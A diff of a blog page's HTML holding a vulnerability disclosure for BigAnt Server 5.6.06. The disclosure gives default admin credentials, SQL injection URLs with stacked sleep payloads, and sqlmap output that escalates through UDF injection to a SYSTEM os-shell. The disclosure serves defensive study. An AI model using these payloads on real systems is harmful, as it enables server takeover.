@@ -4,15 +4,267 @@
     <meta content="text/html; charset=utf-8" http-equiv="content-type" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <link href="//cdn.staticfile.org/Primer/21.0.7/primer.css" rel="stylesheet" />
-    <link rel="icon" href="https://pic.cnblogs.com/avatar/3310985/20231102103108.png">
-    <script>
-        if(localStorage.getItem("meek_theme")==null){}
-        else if(localStorage.getItem("meek_theme")=="dark"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";}
-        else if(localStorage.getItem("meek_theme")=="light"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";}
+    <link href="//cdn.staticfile.net/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://github.com/fish123123/fish123123.github.io/blob/main/81842C81-B807-4587-B684-140AE3240310_1_201_a.jpeg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
     </script>
-    
-<meta name="description" content="BigAnt Server Admin+ Sql Injection">
+<meta name="description" content="### About BigAnt
+
+BigAnt Office Messenger, LAN Messenger for enterprise, a corporate instant messaging solution. Big Ant includes IM Server, instant messaging, file sharing, voip, video chat and more.
+
+### Vulnerability Description
+
+Due to BigAnt Server's failure to filter parameters such as account_order, dev_code, and user_count, users with administrator privileges can inject SQL into the application, which can lead to a vulnerability in remote command execution.
+
+### Affected Version
+
+BigAnt Server 5.6.06
+
+### Vulnerability Verification Environment
+
+Please refer to the official website for vulnerability construction: https://www.bigantsoft.com/
+
+BigAnt Server installation package download address: https://www.bigantsoft.com/download/bigantim56.zip
+
+### Vulnerability Recurrence
+
+1. First log in to BigAnt Server with the administrator account. Default account: superadmin, password: 123456;
+2. After successful login, you can verify the vulnerability. The URL with SQL injection vulnerability is as follows:
+```
+http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?account_order=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/Group/index/clientid/4.html?dev_code=desc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?user_count=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/report/group_msg_list/clientid/4.html?dev_code=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/report/online_list/clientid/4.html?account_order=asc;select%20sleep(5)%23
+```
+
+Use sqlmap to detect sql injection vulnerabilities. The results are as follows:
+
+```
+C:\Users\Administrator\Desktop\项目集合\sqlmap>python sqlmap.py -r test.txt
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.5.9#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
+ consent is illegal. It is the end user's responsibility to obey all applicable
+local, state and federal laws. Developers assume no liability and are not respon
+sible for any misuse or damage caused by this program
+
+[*] starting @ 17:25:02 /2023-12-13/
+
+[17:25:02] [INFO] parsing HTTP request from 'test.txt'
+[17:25:03] [INFO] resuming back-end DBMS 'mysql'
+[17:25:03] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: dev_code (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
+    Payload: dev_code=desc,(SELECT (CASE WHEN (8728=8728) THEN 1 ELSE 8728*(SELE
+CT 8728 FROM INFORMATION_SCHEMA.PLUGINS) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)
+    Payload: dev_code=desc,(SELECT 1543 FROM(SELECT COUNT(*),CONCAT(0x71767a7a71
+,(SELECT (ELT(1543=1543,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SC
+HEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: dev_code=desc;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANA
+LYSE (EXTRACTVALUE)
+    Payload: dev_code=desc PROCEDURE ANALYSE(EXTRACTVALUE(5229,CONCAT(0x5c,(BENC
+HMARK(5000000,MD5(0x644d686d))))),1)#
+---
+[17:25:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: ThinkPHP, Apache 2.4.46
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[17:25:04] [INFO] fetched data logged to text files under 'C:\Users\Administrato
+r\AppData\Local\sqlmap\output\10.3.9.215'
+[17:25:04] [WARNING] your sqlmap version is outdated
+
+```
+
+Through the SQL injection vulnerability, it is found that the current user has database administrator rights (root@localhost), and finally remote command execution can be achieved:
+
+```
+[17:26:46] [INFO] testing if current user is DBA
+[17:26:46] [INFO] fetching current user
+[17:26:46] [INFO] resumed: 'root@localhost'
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+> 2
+[17:26:50] [INFO] checking if UDF 'sys_exec' already exist
+[17:26:51] [INFO] retrieved: '0'
+[17:26:51] [INFO] checking if UDF 'sys_eval' already exist
+[17:26:51] [INFO] retrieved: '0'
+[17:26:51] [INFO] detecting back-end DBMS version from its banner
+[17:26:51] [INFO] resumed: '10.4.12-MariaDB'
+[17:26:51] [INFO] retrieving MySQL plugin directory absolute path
+[17:26:51] [INFO] resumed: 'C:\\Program Files (x86)\\BigAntSoft\\IM Console\\...
+
+[17:27:09] [WARNING] time-based comparison requires larger statistical model, pl
+ease wait............................ (done)
+[17:27:15] [INFO] retrieved: '7168'
+[17:27:15] [INFO] the local file 'C:\Users\ADMINI~1\AppData\Local\Temp\1\sqlmaph
+c_gnw3n14364\lib_mysqludf_syssq_587xx.dll' and the remote file 'C:/Program Files
+ (x86)/BigAntSoft/IM Console/im_dbserver/lib/plugin/libsappi.dll' have the same
+size (7168 B)
+[17:27:15] [INFO] creating UDF 'sys_exec' from the binary UDF file
+[17:27:16] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[17:27:17] [INFO] going to use injected user-defined functions 'sys_eval' and 's
+ys_exec' for operating system command execution
+[17:27:17] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press EN
+TER
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a]
+
+[17:27:24] [INFO] retrieved: 'nt authority\\system'
+command standard output: 'nt authority\system'
+```
+。">
+<meta property="og:title" content="BigAnt Server Admin+ Sql Injection">
+<meta property="og:description" content="### About BigAnt
+
+BigAnt Office Messenger, LAN Messenger for enterprise, a corporate instant messaging solution. Big Ant includes IM Server, instant messaging, file sharing, voip, video chat and more.
+
+### Vulnerability Description
+
+Due to BigAnt Server's failure to filter parameters such as account_order, dev_code, and user_count, users with administrator privileges can inject SQL into the application, which can lead to a vulnerability in remote command execution.
+
+### Affected Version
+
+BigAnt Server 5.6.06
+
+### Vulnerability Verification Environment
+
+Please refer to the official website for vulnerability construction: https://www.bigantsoft.com/
+
+BigAnt Server installation package download address: https://www.bigantsoft.com/download/bigantim56.zip
+
+### Vulnerability Recurrence
+
+1. First log in to BigAnt Server with the administrator account. Default account: superadmin, password: 123456;
+2. After successful login, you can verify the vulnerability. The URL with SQL injection vulnerability is as follows:
+```
+http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?account_order=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/Group/index/clientid/4.html?dev_code=desc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?user_count=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/report/group_msg_list/clientid/4.html?dev_code=asc;select%20sleep(5)%23
+http://127.0.0.1:8000/index.php/Admin/report/online_list/clientid/4.html?account_order=asc;select%20sleep(5)%23
+```
+
+Use sqlmap to detect sql injection vulnerabilities. The results are as follows:
+
+```
+C:\Users\Administrator\Desktop\项目集合\sqlmap>python sqlmap.py -r test.txt
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.5.9#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
+ consent is illegal. It is the end user's responsibility to obey all applicable
+local, state and federal laws. Developers assume no liability and are not respon
+sible for any misuse or damage caused by this program
+
+[*] starting @ 17:25:02 /2023-12-13/
+
+[17:25:02] [INFO] parsing HTTP request from 'test.txt'
+[17:25:03] [INFO] resuming back-end DBMS 'mysql'
+[17:25:03] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: dev_code (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
+    Payload: dev_code=desc,(SELECT (CASE WHEN (8728=8728) THEN 1 ELSE 8728*(SELE
+CT 8728 FROM INFORMATION_SCHEMA.PLUGINS) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)
+    Payload: dev_code=desc,(SELECT 1543 FROM(SELECT COUNT(*),CONCAT(0x71767a7a71
+,(SELECT (ELT(1543=1543,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SC
+HEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: dev_code=desc;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANA
+LYSE (EXTRACTVALUE)
+    Payload: dev_code=desc PROCEDURE ANALYSE(EXTRACTVALUE(5229,CONCAT(0x5c,(BENC
+HMARK(5000000,MD5(0x644d686d))))),1)#
+---
+[17:25:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: ThinkPHP, Apache 2.4.46
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[17:25:04] [INFO] fetched data logged to text files under 'C:\Users\Administrato
+r\AppData\Local\sqlmap\output\10.3.9.215'
+[17:25:04] [WARNING] your sqlmap version is outdated
+
+```
+
+Through the SQL injection vulnerability, it is found that the current user has database administrator rights (root@localhost), and finally remote command execution can be achieved:
+
+```
+[17:26:46] [INFO] testing if current user is DBA
+[17:26:46] [INFO] fetching current user
+[17:26:46] [INFO] resumed: 'root@localhost'
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+> 2
+[17:26:50] [INFO] checking if UDF 'sys_exec' already exist
+[17:26:51] [INFO] retrieved: '0'
+[17:26:51] [INFO] checking if UDF 'sys_eval' already exist
+[17:26:51] [INFO] retrieved: '0'
+[17:26:51] [INFO] detecting back-end DBMS version from its banner
+[17:26:51] [INFO] resumed: '10.4.12-MariaDB'
+[17:26:51] [INFO] retrieving MySQL plugin directory absolute path
+[17:26:51] [INFO] resumed: 'C:\\Program Files (x86)\\BigAntSoft\\IM Console\\...
+
+[17:27:09] [WARNING] time-based comparison requires larger statistical model, pl
+ease wait............................ (done)
+[17:27:15] [INFO] retrieved: '7168'
+[17:27:15] [INFO] the local file 'C:\Users\ADMINI~1\AppData\Local\Temp\1\sqlmaph
+c_gnw3n14364\lib_mysqludf_syssq_587xx.dll' and the remote file 'C:/Program Files
+ (x86)/BigAntSoft/IM Console/im_dbserver/lib/plugin/libsappi.dll' have the same
+size (7168 B)
+[17:27:15] [INFO] creating UDF 'sys_exec' from the binary UDF file
+[17:27:16] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[17:27:17] [INFO] going to use injected user-defined functions 'sys_eval' and 's
+ys_exec' for operating system command execution
+[17:27:17] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press EN
+TER
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a]
+
+[17:27:24] [INFO] retrieved: 'nt authority\\system'
+command standard output: 'nt authority\system'
+```
+。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://fish123123.github.io/post/BigAnt%20Server%20Admin%2B%20Sql%20Injection.html">
+<meta property="og:image" content="https://github.com/fish123123/fish123123.github.io/blob/main/81842C81-B807-4587-B684-140AE3240310_1_201_a.jpeg">
 <title>BigAnt Server Admin+ Sql Injection</title>
 
 
@@ -46,30 +298,29 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="header">
 <h1 class="postTitle">BigAnt Server Admin+ Sql Injection</h1>
 <div class="title-right">
-
-    <a href="https://www.cnblogs.com/you-fish/"><button id="buttonHome" class="btn btn-invisible circle" title="首页">
+    <a href="https://fish123123.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
         <svg class="octicon" width="16" height="16">
-            <path id="pathHome" fill-rule="evenodd" d="M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z"></path>
+            <path id="pathHome" fill-rule="evenodd"></path>
         </svg>
-    </button></a>
-
-    <a href="https://github.com/fish123123/fish123123.github.io/issues/2" target="_blank"><button class="btn btn-invisible circle" title="Issue">
+    </a>
+    
+    <a href="https://github.com/fish123123/fish123123.github.io/issues/2" target="_blank" class="btn btn-invisible circle" title="Issue">
         <svg class="octicon" width="16" height="16">
-            <path id="pathIssue" fill-rule="evenodd" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+            <path id="pathIssue" fill-rule="evenodd"></path>
         </svg>
-    </button></a>
+    </a>
+    
 
-    <button class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
         <svg class="octicon" width="16" height="16" >
             <path id="themeSwitch" fill-rule="evenodd"></path>
         </svg>
-    </button>
+    </a>
 
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody">
-<h3>About BigAnt</h3>
+<div class="markdown-body" id="postBody"><h3>About BigAnt</h3>
 <p>BigAnt Office Messenger, LAN Messenger for enterprise, a corporate instant messaging solution. Big Ant includes IM Server, instant messaging, file sharing, voip, video chat and more.</p>
 <h3>Vulnerability Description</h3>
 <p>Due to BigAnt Server's failure to filter parameters such as account_order, dev_code, and user_count, users with administrator privileges can inject SQL into the application, which can lead to a vulnerability in remote command execution.</p>
@@ -178,12 +429,12 @@ do you want to retrieve the command standard output? [Y/n/a]
 
 [17:27:24] [INFO] retrieved: 'nt authority\\system'
 command standard output: 'nt authority\system'
-</code></pre>
-</div>
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
 <div class="comments" id="comments"></div>
 </div>
-    <div id="footer">Copyright © <span id="year"></span><a href="https://www.cnblogs.com/you-fish/"> Youyu </a>
+    <div id="footer">Copyright © <span id="year"></span><a href="https://fish123123.github.io"> Youyu </a>
 <p><a href="https://beian.miit.gov.cn/" target="_blank">nonono</a>
 <span id="runday"></span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a>
 </p>
@@ -202,40 +453,40 @@ if("12/01/2023"!=""){
 </div>
 </body>
 <script>
-var IconList={'post': 'M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25Zm1.75-.25a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25ZM3.5 6.25a.75.75 0 0 1 .75-.75h7a.75.75 0 0 1 0 1.5h-7a.75.75 0 0 1-.75-.75Zm.75 2.25h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1 0-1.5Z', 'link': 'm7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z', 'about': 'M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z', 'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'rss': 'M2.002 2.725a.75.75 0 0 1 .797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 0 1-1.497.098 10.502 10.502 0 0 0-9.776-9.776.747.747 0 0 1-.7-.798ZM2.84 7.05h-.002a7.002 7.002 0 0 1 6.113 6.111.75.75 0 0 1-1.49.178 5.503 5.503 0 0 0-4.8-4.8.75.75 0 0 1 .179-1.489ZM2 13a1 1 0 1 1 2 0 1 1 0 0 1-2 0Z', 'upload': 'M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z M11.78 4.72a.749.749 0 1 1-1.06 1.06L8.75 3.811V9.5a.75.75 0 0 1-1.5 0V3.811L5.28 5.78a.749.749 0 1 1-1.06-1.06l3.25-3.25a.749.749 0 0 1 1.06 0l3.25 3.25Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
-if(localStorage.getItem("meek_theme")==null){localStorage.setItem("meek_theme","light");changeLight();}
-else if(localStorage.getItem("meek_theme")=="dark"){changeDark();}
-else if(localStorage.getItem("meek_theme")=="light"){changeLight();}
 
-function changeDark(){
-    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";
-    document.getElementById("themeSwitch").setAttribute("d",value=IconList["moon"]);
-    document.getElementById("themeSwitch").parentNode.style.color="#00f0ff";
-    if(utterancesLoad==1){utterancesTheme("dark-blue");}
-}
-function changeLight(){
-    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";
-    document.getElementById("themeSwitch").setAttribute("d",value=IconList["sun"]);
-    document.getElementById("themeSwitch").parentNode.style.color="#ff5000";
-    if(utterancesLoad==1){utterancesTheme("github-light");}
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
 }
 function modeSwitch(){
-    if(document.getElementsByTagName("html")[0].attributes[0].value=="light"){changeDark();localStorage.setItem("meek_theme","dark");}
-    else{changeLight();localStorage.setItem("meek_theme","light");}
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
 }
 function utterancesTheme(theme){
-    const message = {type: 'set-theme',theme: theme};
-    const iframe = document.getElementsByClassName('utterances-frame')[0];
-    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
 }
-
-console.log("\n %c Gmeek main %c https://github.com/Meekdai/Gmeek \n\n", "color: #fff; background-image: linear-gradient(90deg, rgb(47, 172, 178) 0%, rgb(45, 190, 96) 100%); padding:5px 1px;", "background-image: linear-gradient(90deg, rgb(45, 190, 96) 0%, rgb(255, 255, 255) 100%); padding:5px 0;");
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n\n","padding:5px 0;background:#02d81d;color:#fff");
 </script>
 
 <script>
-
-
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
 
